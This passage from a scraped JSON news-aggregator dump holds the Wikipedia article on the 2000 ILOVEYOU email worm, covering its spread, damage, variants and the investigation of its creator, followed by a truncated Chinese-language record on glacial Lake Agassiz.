worm used mailing lists as its source of targets, the messages often appeared to come from acquaintances and were therefore often regarded as &#34;safe&#34; by their victims, providing further incentive to open them. Only a few users at each site had to access the attachment to generate millions more messages that crippled mail systems and overwrote millions of files on computers in each successive  network.\n  The worm originated in the  Pandacan neighborhood of  Manila in the Philippines on May 4, 2000,  [3] thereafter following daybreak westward across the world as employees began their workday that Friday morning, moving first to Hong Kong, then to Europe, and finally the United States.  [4]  [1] The outbreak was later estimated to have caused US$5.5\u20138.7 billion in damages worldwide,  [5]  [6] [   better\u00a0source\u00a0needed] and estimated to cost US$15 billion to remove the worm.  [7] Within ten days, over fifty million infections had been reported,  [8] and it is estimated that 10% of internet-connected computers in the world had been affected.  [6] [   better\u00a0source\u00a0needed] Damage cited was mostly the time and effort spent getting rid of the infection and recovering files from backups. To protect themselves,  The Pentagon,  CIA, the  British Parliament and most large corporations decided to completely shut down their mail systems.  [9] The ILOVEYOU worm infected computers all over the world. At the time it was one of the world&#39;s most destructive computer related disasters ever.\n The events inspired the song &#34;E-mail&#34; on the  Pet Shop Boys&#39; UK top-ten album of 2002,   Release, the lyrics of which play thematically on the human desires which enabled the mass destruction of this computer infection.\n  The ILOVEYOU Script (the attachment) was written in Microsoft  Visual Basic Scripting (VBS) which runs in  Microsoft Outlook and was enabled by default. The script adds  Windows Registry data for automatic startup on system boot.\n The worm searches connected drives and replaces files with extensions  JPG,  JPEG,  VBS, VBE,  JS, JSE,  CSS,  WSH,  SCT,  DOC,  HTA,  MP2, and  MP3 with copies of itself, while appending the additional file extension VBS, making the user&#39;s computer unbootable. However, MP3s and other sound related files would be hidden rather than overwritten.\n The worm propagates itself by sending out one copy of the payload to each entry in the  Microsoft Outlook address book (Windows Address Book). It also downloads the Barok  trojan renamed for the occasion as &#34;WIN-BUGSFIX.EXE&#34;.\n The fact that the worm was written in VBS provided users a way to modify it. A user could easily modify the worm to replace important files in the system, and destroy it. This allowed more than twenty five variations of ILOVEYOU to spread across the internet, each one doing different kinds of damage.  [10] Most of the variations had to do with what file extensions were affected by the worm. Others simply modified the email subject in order to make it targeted towards a specific audience, like variant &#34;Cartolina&#34; in Italian, or variant &#34;BabyPic&#34; for adults. Some others only modified the credits to the author, which were originally included in the standard version of the virus, removing them completely or referencing false authors.  [10]\n    On 5 May 2000, two young Filipino programmers named Reonel Ramones and  Onel de Guzman became targets of a  criminal investigation by agents of the Philippines&#39;  National Bureau of Investigation (NBI).  [12] Local  Internet service provider Sky Internet had reported receiving numerous contacts from European computer users alleging that malware (in the form of the &#34;ILOVEYOU&#34; worm) had been sent via the ISP&#39;s servers.\n After surveillance and investigation by Darwin Bawasanta of Sky Internet, the NBI traced a frequently appearing telephone number to Ramones&#39; apartment in  Manila. His residence was searched and Ramones was arrested and placed under investigation by the  Department of Justice (DOJ). Onel de Guzman was also charged   in absentia. [   citation needed]\n At that point, the NBI were unsure what felony or crime would apply.  [12] It was suggested they be charged with violating Republic Act 8484 (the Access Device Regulation Act), a law designed mainly to penalise  credit card fraud, since both used pre-paid (if not stolen) Internet cards to purchase access to ISPs. Another idea was that they be charged with malicious  mischief, a felony (under the Philippines Revised Penal Code of 1932) involving damage to property. The drawback here was that one of its elements, aside from damage to property, was intent to damage, and de Guzman had claimed during custodial investigations that he might have unwittingly released the worm.  [13] At a press conference organised by his lawyer on 11 May, he said &#34;It is possible&#34; when asked whether he might have done so.\n To show intent, the NBI investigated  AMA Computer College, where de Guzman had dropped out at the very end of his final year.  [12] They found that, for his undergraduate thesis, de Guzman had proposed the implementation of a  trojan to steal Internet login passwords.  [14] This way, he proposed, users would finally be able to afford an Internet connection. The proposal was rejected by the College of  Computer Studies board,  [13] prompting de Guzman to cancel his studies the day before graduation.\n In May 2020, it was revealed that while researching his cybercrime book Crime Dot Com, investigative journalist Geoff White had found Onel de Guzman working at a mobile phone repair stall in Manila. De Guzman admitted creating and releasing the virus. He claimed he had initially developed it to steal Internet access passwords, since he could not afford to pay for access. He said that  Michael Buen, who had also fallen under suspicion during the investigation, had nothing to do with the virus&#39; creation.  [15]\n  Since there were no laws in the Philippines against writing malware at the time, both Ramones and de Guzman were released with all charges dropped by state prosecutors.  [16] To address this legislative deficiency,  [12] the Philippine Congress enacted Republic Act No. 8792,  [17] otherwise known as the E-Commerce Law, in July 2000, just two months after the worm outbreak. In 2012, the  Smithsonian Institution named ILOVEYOU the tenth-most virulent computer virus in history.  [2]\n In April 2019, de Guzman admitted to a reporter that he had created the virus in order to harvest internet login passwords.  [15]  [18]\n    ^     a     b   Kane, Margaret (4 May 2000).  &#34; &#39;ILOVEYOU&#39; e-mail worm invades PCs&#34;.   ZDNet News. Archived from  the original on 2008-12-27.\n  ^    &#34;No excuse for virus toll, warns MessageLabs&#34;. MessageLabs. 10 May 2000. Archived from  the original on 2000-12-14.\n    ^   Buckland, Jason.  &#34;The &#39;love&#39; bug \u2014 10 worst cybercrimes of the decade&#34;.  tech.ca.msn.com. Archived from  the original on 2011-10-27.\n ^   Barker, Gary (14 May 2000). &#34;Microsoft May Have Been Target of Lovebug&#34;.  The Age.\n ^   Kane, Margaret (May 4, 2000).  &#34;British parliament shut down their mail systems to prevent damage&#34;.   ZDNet News. Archived from  the original on September 23, 2007.\n    ^     a     b   Landler, Mark (2000-10-21).  &#34;A Filipino Linked to &#39;Love Bug&#39; Talks About His License to Hack&#34;.  The New York Times .\n ^    &#34;Onel de Guzman&#39;s rejected thesis proposal at AMA Computer College&#34;.  ComputerBytesMan.com. Archived from  the original on 2010-04-26 .\n ^     a     b   White, Geoff (2 May 2020).  &#34;Love Bug&#39;s creator tracked down to repair shop in Manila&#34;. BBC News.\n ^   Arnold, Wayne (2000-08-22).  &#34;Technology; Philippines to Drop Charges on E-Mail Virus&#34;.  The New York Times .\n  ^   White, Geoff (21 April 2020).  &#34;Revealed: The man behind the first major computer virus pandemic&#34;.  Computer Weekly.", "posttime": "2020-05-05 12:47:19", "tags": "iloveyou,\u6587\u4ef6,worm", "title": "\u7231\u4f60", "title_en": "Iloveyou", "transed": 1, "url": "https://en.wikipedia.org/wiki/ILOVEYOU", "via": "", "source_name": "Hacker News", "source_domain": "news.ycombinator.com", "real_tags": ["iloveyou", "\u6587\u4ef6", "worm"]}, {"category": "", "categoryclass": "", "imagename": "e7432b517417225b7430e91af64fcb7b.jpg", "infoid": 1000695, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "\u8df3\u5230\u822a\u6d77\u8df3\u8dc3\u641c\u7d22\u5317\u7f8e\u4e2d\u90e8\u4e0a\u4e00\u6b21\u51b0\u671f\u672b\u671f\u7684\u4e00\u4e2a\u975e\u5e38\u5927\u7684\u51b0\u5ddd\u6e56\u3002\n\u963f\u52a0\u897f\u6e56\u662f\u5317\u7f8e\u4e2d\u90e8\u7684\u4e00\u4e2a\u975e\u5e38\u5927\u7684\u51b0\u5ddd\u6e56\u3002\u5b83\u5728\u4e0a\u4e00\u6b21\u51b0\u671f\u672b\u671f\u53d7\u5230\u51b0\u5ddd\u878d\u5316\u6c34\u7684\u6ecb\u517b\uff0c\u9762\u79ef\u6bd4\u6240\u6709\u73b0\u4ee3\u4e94\u5927\u6e56\u7684\u603b\u548c\u8fd8\u8981\u5927[2]\uff0c\u5c3d\u7ba1\u5b83\u7684\u5e73\u5747\u6df1\u5ea6\u6ca1\u6709\u4eca\u5929\u7684\u8bb8\u591a\u4e3b\u8981\u6e56\u6cca\u90a3\u4e48\u5927\u3002\n1823\u5e74\u5a01\u5ec9\u00b7H\u00b7\u57fa\u5ef7\u9996\u6b21\u63d0\u51fa\u8fd9\u4e00\u5047\u8bbe[3]\uff0c1879\u5e74\u6c83\u4f26\u00b7\u5384\u666e\u6c49\u59c6\u4ee5\u8def\u6613\u65af\u00b7\u963f\u52a0\u897f\u7684\u540d\u5b57\u7ed9\u5b83\u547d\u540d\uff0c\u5f53\u65f6\u5384\u666e\u6c49\u59c6\u8ba4\u8bc6\u5230\u8fd9\u4e2a\u6e56\u662f\u7531\u51b0\u5ddd\u4f5c\u7528\u5f62\u6210\u7684\u3002[4]\u3002\n\u5728\u4e0a\u4e00\u4e2a\u51b0\u6cb3\u65f6\u4ee3\uff0c\u5317\u7f8e\u5317\u90e8\u88ab\u51b0\u76d6\u8986\u76d6\uff0c\u968f\u7740\u6c14\u5019\u7684\u53d8\u5316\uff0c\u51b0\u76d6\u4ea4\u66ff\u524d\u8fdb\u548c\u540e\u9000\u3002\u8fd9\u5757\u5927\u9646\u51b0\u76d6\u5f62\u6210\u4e8e\u73b0\u5728\u88ab\u79f0\u4e3a\u5a01\u65af\u5eb7\u661f\u51b0\u5ddd\u7684\u65f6\u671f\uff0c\u5e76\u57283\u4e07\u81f310000\u5e74\u524d\u8986\u76d6\u4e86\u5317\u7f8e\u4e2d\u90e8\u7684\u5927\u90e8\u5206\u5730\u533a\u3002\u968f\u7740\u51b0\u76d6\u7684\u89e3\u4f53\uff0c\u878d\u5316\u7684\u51b0\u5ddd\u5f62\u6210\u4e86\u4e00\u4e2a\u5de8\u5927\u7684\u51b0\u5ddd\u6e56\u3002[6]\u3002\n\u5927\u7ea6\u572813000\u5e74\u524d\uff0c\u8fd9\u4e2a\u6e56\u8986\u76d6\u4e86\u73b0\u5728\u7684\u9a6c\u5c3c\u6258\u5df4\u7701\u3001\u5b89\u5927\u7565\u7701\u897f\u5317\u90e8\u3001\u660e\u5c3c\u82cf\u8fbe\u5dde\u5317\u90e8\u3001\u5317\u8fbe\u79d1\u4ed6\u5dde\u4e1c\u90e8\u548c\u8428\u65af\u5580\u5f7b\u6e29\u7701\u7684\u5927\u90e8\u5206\u5730\u533a\u3002\u5728\u5176\u6700\u5927\u8303\u56f4\u5185\uff0c\u5b83\u53ef\u80fd\u8986\u76d6\u4e86\u591a\u8fbe44\u4e07\u5e73\u65b9\u516c\u91cc2(17\u4e07\u5e73\u65b9\u82f1\u91cc)\uff0c[7]\u6bd4\u4e16\u754c\u4e0a\u76ee\u524d\u5b58\u5728\u7684\u4efb\u4f55\u6e56\u6cca(\u5305\u62ec\u91cc\u6d77)\u90fd\u5927\uff0c\u5927\u7ea6\u76f8\u5f53\u4e8e\u9ed1\u6d77\u7684\u9762\u79ef\u3002\n\u6709\u65f6\uff0c\u8fd9\u4e2a\u6e56\u901a\u8fc7Traverse Gap\u5411\u5357\u6d41\u5165\u51b0\u5ddd\u6c83\u4f26\u6cb3(\u5bc6\u897f\u897f\u6bd4\u6cb3\u7684\u4e00\u6761\u652f\u6d41\u660e\u5c3c\u82cf\u8fbe\u5dde\u6cb3\u7684\u6bcd\u6cb3)\uff0c[8]\u5411\u4e1c\u901a\u8fc7\u5f00\u5c14\u6587\u6e56(\u73b0\u5728\u7684\u5c3c\u76ae\u8d21\u6e56)\u8fdb\u5165\u73b0\u5728\u7684\u82cf\u5fc5\u5229\u5c14\u6e56\uff0c[9]\u5411\u897f\u5317\u901a\u8fc7\u6e05\u6c34\u6ea2\u6d2a\u9053\u8fdb\u5165\u9ea6\u80af\u9f50\u6cb3\u6c34\u7cfb\u548c\u5317\u51b0\u6d0b\u3002[2][10][11]\u3002\n\u51b0\u4e00\u5ea6\u56de\u5230\u5357\u65b9\uff0c\u4f46\u5927\u7ea610000\u5e74\u524d\uff0c\u5f53\u5b83\u518d\u6b21\u64a4\u9000\u5230\u73b0\u5728\u7684\u52a0\u62ff\u5927\u548c\u7f8e\u56fd\u8fb9\u5883\u4ee5\u5317\u65f6\uff0c\u963f\u52a0\u897f\u6e56\u91cd\u65b0\u5145\u6ee1\u4e86\u6c34\u3002\u4e0a\u4e00\u6b21\u6392\u6c34\u7684\u91cd\u5927\u8f6c\u53d8\u53d1\u751f\u5728\u5927\u7ea68200\u5e74\u524d\u3002\u54c8\u5fb7\u900a\u6e7e\u5269\u4f59\u51b0\u7684\u878d\u5316\u5bfc\u81f4\u963f\u52a0\u897f\u6e56\u51e0\u4e4e\u5b8c\u5168\u6392\u5e72\u3002\u963f\u52a0\u897f\u6e56\u7684\u6700\u7ec8\u6392\u6c34\u4e0e\u5168\u7403\u6d77\u5e73\u9762\u4f30\u8ba1\u4e0a\u53470.8\u81f32.8\u7c73(2.6\u81f39.2\u82f1\u5c3a)\u6709\u5173\u3002[12]\u3002\n\u963f\u52a0\u897f\u6e56\u7684\u4e3b\u8981\u6392\u6c34\u7cfb\u7edf\u91cd\u7ec4\u4e8b\u4ef6\u7684\u89c4\u6a21\u5982\u6b64\u4e4b\u5927\uff0c\u4ee5\u81f3\u4e8e\u5b83\u4eec\u5bf9\u6c14\u5019\u3001\u6d77\u5e73\u9762\u751a\u81f3\u53ef\u80fd\u662f\u65e9\u671f\u4eba\u7c7b\u6587\u660e\u90fd\u4ea7\u751f\u4e86\u91cd\u5927\u5f71\u54cd\u3002\u636e\u63a8\u6d4b\uff0c\u8be5\u6e56\u5411\u5317\u51b0\u6d0b\u91ca\u653e\u4e86\u5927\u91cf\u6de1\u6c34\uff0c\u6270\u4e71\u4e86\u6d77\u6d0b\u5faa\u73af\uff0c\u5e76\u9020\u6210\u4e86\u6682\u65f6\u7684\u964d\u6e29\u300213\uff0c000\u5e74\u524d\u7684\u67af\u7aed\u53ef\u80fd\u662f\u5e74\u8f7b\u4ed9\u5973\u5ea7\u7684\u8d77\u56e0\u3002[2][13][14]\u867d\u7136\u6709\u4e89\u8bae\uff0c[15]9900-10000\u5e74\u524d\u7684\u6392\u6cc4\u53ef\u80fd\u662f8200\u5e74\u6c14\u5019\u4e8b\u4ef6\u7684\u539f\u56e0\u3002\u7279\u5c3c\u548c\u5e03\u6717\u6700\u8fd1\u7684\u4e00\u9879\u7814\u7a76\u5c068500\u5e74\u524d\u7684\u6392\u6c34\u4e0e\u6574\u4e2a\u6b27\u6d32\u4ece\u4e1c\u5230\u897f\u7684\u519c\u4e1a\u6269\u5f20\u8054\u7cfb\u5728\u4e00\u8d77\uff1b\u4ed6\u4eec\u8ba4\u4e3a\uff0c\u8fd9\u4e5f\u53ef\u80fd\u89e3\u91ca\u4e86\u53f2\u524d\u6587\u5316\u7684\u5404\u79cd\u6d2a\u6c34\u795e\u8bdd\uff0c\u5305\u62ec\u5723\u7ecf\u4e2d\u7684\u6d2a\u6c34\u53d9\u4e8b\u3002[16]\n\u54c8\u5fb7\u900a\u6e7e\u548c\u58a8\u897f\u54e5\u6e7e\u4e4b\u95f4\u7684\u6392\u6c34\u6700\u4f4e\u70b9\u4f4d\u4e8e\u7f8e\u56fd\u660e\u5c3c\u82cf\u8fbe\u5dde\u548c\u5357\u8fbe\u79d1\u4ed6\u5dde\u4e4b\u95f4\u7684Traverse Gap\u3002\u5b83\u4f4d\u4e8e\u7279\u62c9\u5f17\u65af\u6e56\u548c\u5927\u77f3\u6e56\u4e4b\u95f4\u3002[17]\u8fd9\u4e00\u5927\u9646\u5206\u6c34\u5cad\u6d77\u62d4\u7ea6300\u7c73(980\u82f1\u5c3a)\u3002[18]\u5f53\u963f\u52a0\u897f\u6e56\u5b58\u5728\u65f6\uff0c\u8fd9\u4e2a\u7f3a\u53e3\u662f\u6c83\u4f26\u6cb3\u7684\u51fa\u53e3\u3002\u4ece\u878d\u5316\u7684\u51b0\u5ddd\u6d41\u51fa\u7684\u6c34\u586b\u6ee1\u4e86\u963f\u52a0\u897f\u65af\u6e56\uff0c\u7136\u540e\u901a\u8fc7\u7f3a\u53e3\u6d41\u5165\u58a8\u897f\u54e5\u6e7e\u3002\u8fd9\u4e9b\u6d41\u52a8\u7684\u6c34\u6d41\u4fb5\u8680\u4e86\u4e00\u4e2a\u5927\u7ea62-5\u516c\u91cc(1.2-3.1\u7c73)\u5bbd\uff0c100\u82f1\u5c3a(30\u7c73)\u5230125\u82f1\u5c3a(38\u7c73)\u6df1\u7684\u5c71\u8c37\u3002[8][19]\u4eca\u5929\uff0c\u8fd9\u4e2a\u5c71\u8c37\u5305\u542b\u660e\u5c3c\u82cf\u8fbe\u5dde\u7684\u660e\u5c3c\u82cf\u8fbe\u5dde\u6cb3\uff0c\u5728\u660e\u5c3c\u82cf\u8fbe\u5dde\u7684\u95e8\u591a\u5854\u5e02\u4e0e\u5bc6\u897f\u897f\u6bd4\u6cb3\u4e0a\u6e38\u6c47\u5408\u3002\u539f\u6e56\u5e8a\u7684\u5317\u90e8\u662f\u5317\u65b9\u7ea2\u6cb3\u6cb3\u8c37\uff0c\u5411\u5317\u6d41\u5165\u6e29\u5c3c\u4f2f\u6e56\u3002[19]\u3002\n\u5728\u6d1b\u514b\u54c8\u7279\u9636\u6bb5\uff0c\u5317\u8fbe\u79d1\u4ed6\u5dde\u548c\u660e\u5c3c\u82cf\u8fbe\u5dde\u7684\u7ea2\u6cb3\u8c37\u79ef\u6c34\u3002\u5f53\u6c34\u5230\u8fbe\u5357\u90e8\u5206\u6c34\u5cad\u7684\u9876\u7aef\u65f6\uff0c\u6c34\u5c31\u6392\u5165\u4e86\u7956\u5148\u660e\u5c3c\u82cf\u8fbe\u5dde\u548c\u5bc6\u897f\u897f\u6bd4\u6cb3\u7684\u6c34\u7cfb\u3002\u8fd9\u53d1\u751f\u5728\u52b3\u4f26\u65af\u51b0\u76d6\u4f4d\u4e8e\u6216\u4f4e\u4e8e\u5f53\u524d\u52a0\u62ff\u5927-\u7f8e\u56fd\u8fb9\u754c\u7684\u65f6\u5019\u3002[1]\u968f\u7740\u51b0\u76d6\u5411\u5317\u878d\u5316\uff0c\u65e9\u671f\u7684\u963f\u52a0\u897f\u6e56\u8986\u76d6\u4e86\u660e\u5c3c\u82cf\u8fbe\u5dde\u548c\u5b89\u5927\u7565\u7701\u4ea4\u754c\u7684\u9a6c\u5c3c\u6258\u5df4\u7701\u5357\u90e8\uff0c\u4ee5\u53ca\u5317\u8fbe\u79d1\u4ed6\u5dde\u6cd5\u6208\u4ee5\u5357\u7684\u7ea2\u6cb3\u6cbf\u5cb8\u3002\u6d1b\u514b\u54c8\u7279\u9636\u6bb5\u4e0e\u8d6b\u5c14\u66fc\u6e56\u9636\u6bb5(335\u7c73(1099\u82f1\u5c3a))\u6709\u5173\uff0c\u8d6b\u5c14\u66fc\u6e56\u9636\u6bb5\u662f\u963f\u52a0\u897f\u6e56\u6700\u9ad8\u7684\u6d77\u5cb8\u7ebf\u3002\u5927\u77f3\u5934\u51b0\u6cb3\u5f62\u6210\u4e86\u6e56\u7684\u5357\u90e8\u8fb9\u754c\u3002\u5728\u6d1b\u514b\u54c8\u7279\u9636\u6bb5\uff0c\u8be5\u6e56\u4f30\u8ba1\u6709231\u7c73(758\u82f1\u5c3a)\u6df1\uff0c\u51b0\u5ddd\u9644\u8fd1\u7684\u6df1\u5ea6\u66f4\u5927\u3002[1]\u3002\n\u968f\u7740\u51b0\u76d6\u5411\u5317\u878d\u5316\uff0c\u963f\u52a0\u897f\u6e56\u6cbf\u7740\u73b0\u4ee3\u660e\u5c3c\u82cf\u8fbe\u5dde-\u5b89\u5927\u7565\u7701\u8fb9\u754c\uff0c\u901a\u8fc7\u5361\u7c73\u5c3c\u65af\u63d0\u514b\u7ef4\u4e9a\u8def\u7ebf\u627e\u5230\u4e86\u4e00\u4e2a\u8f83\u4f4e\u7684\u51fa\u53e3\u3002\u8fd9\u5c06\u6c34\u8f6c\u79fb\u5230\u4e86\u5fb7\u5362\u65af\u6e56\uff0c\u8fd9\u662f\u82cf\u5fc5\u5229\u5c14\u6e56\u76c6\u5730\u7684\u4e00\u4e2a\u51b0\u5ddd\u6e56\u3002\u4ece\u90a3\u91cc\uff0c\u6c34\u901a\u8fc7\u7956\u5148\u5723\u514b\u7f57\u4f0a\u6cb3\u548c\u5bc6\u897f\u897f\u6bd4\u6cb3\u7684\u6c34\u7cfb\u5411\u5357\u6392\u51fa\u3002\u8fd9\u4e2a\u6e56\u6392\u5e72\u4e86\u8d6b\u5c14\u66fc\u6e56\u6d77\u6ee9\u4e0b\u9762\u7684\u6c34\uff0c\u76f4\u5230\u5747\u8861\u53cd\u5f39\u548c\u51b0\u5ddd\u63a8\u8fdb\u5173\u95ed\u4e86\u5361\u7c73\u5c3c\u65af\u8482\u514b\u7ef4\u4e9a\u8def\u7ebf\u3002\u8fd9\u7a33\u5b9a\u4e86\u8bfa\u514b\u7f57\u65af\u6e56\u9636\u6bb5(325\u7c73(1066\u82f1\u5c3a))\u7684\u6e56\u6cca\u3002[1][20][20]\u963f\u52a0\u897f\u6e56\u5728\u6469\u5c14\u9ed1\u5fb7\u665a\u671f\u7684\u5e73\u5747\u6df1\u5ea6\u4e3a258\u7c73(846\u82f1\u5c3a)\u3002\u963f\u52a0\u897f\u65af\u6e56\u7684\u6392\u6c34\u7ee7\u7eed\u4ece\u53e4\u8001\u7684\u660e\u5c3c\u82cf\u8fbe\u5dde\u548c\u5bc6\u897f\u897f\u6bd4\u6cb3\u6c34\u7cfb\u5411\u5357\u6d41\u5165\u58a8\u897f\u54e5\u6e7e\u3002[1]\u3002\n\u5728\u827e\u9ed8\u751f\u9636\u6bb5\uff0c\u6e56\u6cca\u6c34\u4f4d\u548c\u6392\u6c34\u6a21\u5f0f\u4e0d\u65ad\u6ce2\u52a8\u3002\u6e56\u6c34\u4ece\u5411\u5357\u7684\u51fa\u6c34\u53e3\u8f6c\u53d8\u4e3a\u5411\u897f\u5317\u7684\u51fa\u6c34\u53e3\uff0c\u5728\u8fd9\u4e00\u9636\u6bb5\u53ef\u80fd\u662f\u9759\u6b62\u7684\uff0c\u6ca1\u6709\u660e\u663e\u7684\u51fa\u6c34\u53e3\u3002\u5747\u8861\u53cd\u5f39\u6539\u53d8\u4e86\u9646\u5730\u7684\u9ad8\u5ea6\uff0c\u518d\u52a0\u4e0a\u51b0\u7f18\u878d\u5316\u6c34\u91cf\u7684\u53d8\u5316\u548c\u4e1c\u90e8Kaministikwia\u51fa\u53e3\u7684\u5173\u95ed\uff0c\u589e\u52a0\u4e86\u6e56\u6cca\u5317\u7aef\u7684\u9762\u79ef\u3002[1]\u4e00\u79cd\u5047\u8bbe\u5047\u8bbe\u8be5\u6e56\u662f\u4e00\u4e2a\u201c\u7ec8\u7aef\u6e56\u201d\uff0c\u6c34\u91cf\u548c\u84b8\u6563\u91cf\u76f8\u7b49\u3002\u51b0\u5ddd\u51b0\u5ddd\u6d4b\u5e74\u8868\u660e\uff0c\u6e05\u6c34\u548c\u963f\u8428\u5df4\u65af\u5361\u6cb3\u6c34\u7cfb\u4ee5\u53ca\u5c3c\u76ae\u8d21\u6e56\u548c\u7c73\u519c\u76c6\u5730\u4ecd\u7136\u88ab\u51b0\u8986\u76d6\u3002\u964d\u6c34\u548c\u878d\u6c34\u8f93\u5165\u4e0e\u84b8\u6563\u901f\u7387\u7684\u5e73\u8861\u671f\u53ef\u80fd\u5df2\u7ecf\u5b58\u5728\u4e86\u5f88\u77ed\u7684\u4e00\u6bb5\u65f6\u95f4\u3002[1]\u5728\u6b64\u9636\u6bb5\uff0c\u6e05\u6c34\u548c\u963f\u8428\u5df4\u65af\u5361\u6cb3\u7cfb\u7edf\u51fa\u53e3\u5f00\u653e\u3002\u5747\u8861\u53cd\u5f39\u4e00\u5ea6\u6253\u5f00\u4e86\u5357\u90e8\u51fa\u53e3\uff0c\u521b\u9020\u4e86\u8bfa\u514b\u7f57\u65af(325\u7c73(1066\u82f1\u5c3a))\u3001\u5ef7\u5854(310\u7c73(1020\u82f1\u5c3a))\u548c\u4e0a\u574e\u8d1d\u5c14(299\u7c73(981\u82f1\u5c3a))\u6d77\u6ee9\u3002\u5357\u51fa\u53e3\u5728\u827e\u9ed8\u751f\u9636\u6bb5\u7ed3\u675f\u65f6\u6c38\u4e45\u5173\u95ed\u3002[1]\u3002\n\u5411\u4e1c\u7684Kaministikwia\u51fa\u53e3\u7684\u5f00\u653e\u5f00\u542f\u4e86\u5c3c\u76ae\u8d21\u9636\u6bb5\u7684\u5f00\u59cb\u3002\u8f83\u4f4e\u7684\u6e56\u9762\u901a\u8fc7\u660e\u5c3c\u82cf\u8fbe\u5dde\u548c\u5bc6\u897f\u897f\u6bd4\u6cb3\u7684\u7956\u5148\u6c34\u7cfb\u7ed3\u675f\u4e86\u5357\u90e8\u7684\u51fa\u6c34\u53e3\u3002[1]\u51b0\u76d6\u901a\u8fc7\u6e05\u6c34\u548c\u963f\u8428\u5df4\u65af\u5361\u7cfb\u7edf\u63a8\u8fdb\u5e76\u5835\u585e\u4e86\u897f\u5317\u51fa\u53e3\u3002\u8fd8\u6709\u5176\u4ed6\u51e0\u4e2a\u8fdb\u5165\u7c73\u519c\u6e56\u76c6\u5730\u7684\u4f4e\u6c34\u4f4d\u51fa\u53e3\uff0c\u5305\u62ecKaministikwia\u548cNipigon\u6e56\u51fa\u53e3\u3002\u8fd9\u4f7f\u5f97\u5927\u91cf\u7684\u6c34\u4ece\u963f\u52a0\u897f\u6e56\u6d41\u5165\u7c73\u519c\u6e56\u300210500\u52309500 YBP\u4e4b\u95f4\u7684\u4e00\u7cfb\u5217\u51b0\u7684\u8fdb\u9000\u5835\u585e\u4e86\u5c3c\u5e87\u8d21\u6e56\u51fa\u6c34\u53e3\u548c\u5176\u4ed6\u4f4e\u6c34\u4f4d\u51fa\u6c34\u53e3\uff0c\u9020\u6210\u95f4\u6b47\u6027\u707e\u96be\u6027\u7684\u6c34\u55b7\u53d1\u8fdb\u5165\u7c73\u519c\u6e56\u76c6\u5730\u3002[1]\u3002\n\u8fd9\u4e9b\u5927\u91cf\u7684\u6c34\u7684\u6d41\u5165\u63d0\u9ad8\u4e86\u7c73\u519c\u6e56\u7684\u6c34\u4f4d\uff0c\u5e76\u6d41\u5165\u4e86\u5bc6\u6b47\u6839\u6e56/\u4f11\u4f26\u6e56\u76c6\u5730\u7684\u963f\u5c14\u5188\u6606\u6e56\u3002[1]\u8fd9\u4e9b\u55b7\u53d1\u91cd\u65b0\u586b\u6ee1\u4e86\u5bc6\u6b47\u6839\u6e56\u548c\u4f11\u4f26\u6e56\u76c6\u5730\uff0c\u8fd9\u662f\u5947\u4f69\u74e6\u6e56(\u5bc6\u6b47\u6839\u6e56\u76c6\u5730)\u548c\u65af\u5766\u5229\u6e56(\u4f11\u4f26\u6e56\u76c6\u5730)\u7684\u6781\u4f4e\u6c34\u4f4d\u3002\u8fd9\u662f\u7531\u4e8e\u5317\u90e8\u6d77\u5cb8\u7ebf\u7684\u5747\u8861\u53cd\u5f39\u548c\u4f11\u4f26\u6e56\u76c6\u5730\u5317\u6e7e\u51fa\u6d77\u53e3\u7684\u5f00\u653e\u6240\u81f4\u3002[1]\u8fd9\u4e9b\u4ece\u963f\u52a0\u897f\u6e56\u4e0d\u65ad\u6d8c\u51fa\u7684\u6d2a\u6c34\u6df9\u6ca1\u4e86\u7c73\u519c\u6e56\u76c6\u5730\uff0c\u7136\u540e\u6d41\u5165\u4e86\u65af\u5766\u5229\u5df4\u6e56\n\u5728\u8fd9\u4e2a\u51b0\u5ddd\u6e56\u76c6\u4e2d\u5f62\u6210\u4e86\u8bb8\u591a\u6e56\u6cca\u3002\u6700\u8457\u540d\u7684\u662f\u9a6c\u5c3c\u6258\u5df4\u7701\u7684\u4e94\u5927\u6e56\uff1b\u6e29\u5c3c\u4f2f\u6e56\u3001\u9a6c\u5c3c\u6258\u5df4\u6e56\u548c\u6e29\u5c3c\u4f69\u6208\u897f\u65af\u6e56\u3002\u8fd9\u4e9b\u6e56\u6cca\u5468\u56f4\u73af\u7ed5\u7740\u51e0\u4e2a\u8f83\u5c0f\u7684\u6e56\u6cca\uff0c\u5305\u62ec\uff1a\u8428\u65af\u5580\u5f7b\u6e29\u6cb3\u6d41\u7ecf\u7684\u96ea\u677e\u6e56\uff1b\u6e29\u5c3c\u8d1d\u54e5\u65af\u6e56\u4ee5\u5357\u7684\u591a\u82ac\u6e56\u53ca\u5176\u652f\u6d41\uff1b\u4ee5\u53ca\u8d39\u5c14\u798f\u5fb7\u6216\u5c0f\u8428\u65af\u5580\u5f7b\u6e29\u6cb3\u4e0a\u7684\u5723\u9a6c\u4e01\u6e56\uff0c\u9a6c\u5c3c\u6258\u5df4\u6e56\u548c\u6e29\u5c3c\u8d1d\u6208\u897f\u6e56\u7684\u51fa\u53e3\u3002[19]\u5728\u660e\u5c3c\u82cf\u8fbe\u5dde\u5317\u90e8\uff0c\u9664\u4e86\u8be5\u5dde\u7684\u4e09\u4e2a\u5927\u6e56\u96e8\u6e56\u3001\u4f0d\u5179\u6e56\u548c\u7ea2\u6e56\u5916\uff0c\u8fd8\u6709\u7f57\u68ad\u6e56\u3001\u5c0f\u5077\u6e56\u3001\u6ce5\u6e56\u548c\u67ab\u6e56\u3002[19]\u3002\n\u5357\u90e8\u5730\u533a\u5bbd25\u82f1\u91cc(40\u516c\u91cc)\u3002\u5317\u90e8\u5730\u533a\u5bbd60\u82f1\u91cc(97\u516c\u91cc)\u3002\n85\u82f1\u91cc\u52302\u82f1\u91cc(3\u516c\u91cc)\u52304\u82f1\u91cc(6\u516c\u91cc)\u5bbd\u7684\u6d77\u5ce1\uff0c\u5ef6\u4f38\u523012\u82f1\u91cc(19\u516c\u91cc)\u7684\u72d7\u89d2\u3002\u6700\u7a84\u7684\u7ea61\u82f1\u91cc(1.6\u516c\u91cc)\u5bbd\uff0c\u4e94\u5206\u4e4b\u4e94\u7684\u6e56\u6cca\u4f4d\u4e8e\u6d77\u89d2\u4ee5\u5317\uff0c\u516d\u5206\u4e4b\u4e00\u7684\u6e56\u6cca\u4f4d\u4e8e\u6d77\u89d2\u4ee5\u5357\u3002\n\u51b0\u5ddd\u6e56Souris\u6cbf\u7740\u9a6c\u5c3c\u6258\u5df4\u7701\u548c\u5317\u8fbe\u79d1\u4ed6\u5dde\u7684\u8fb9\u754c\u5f62\u6210\u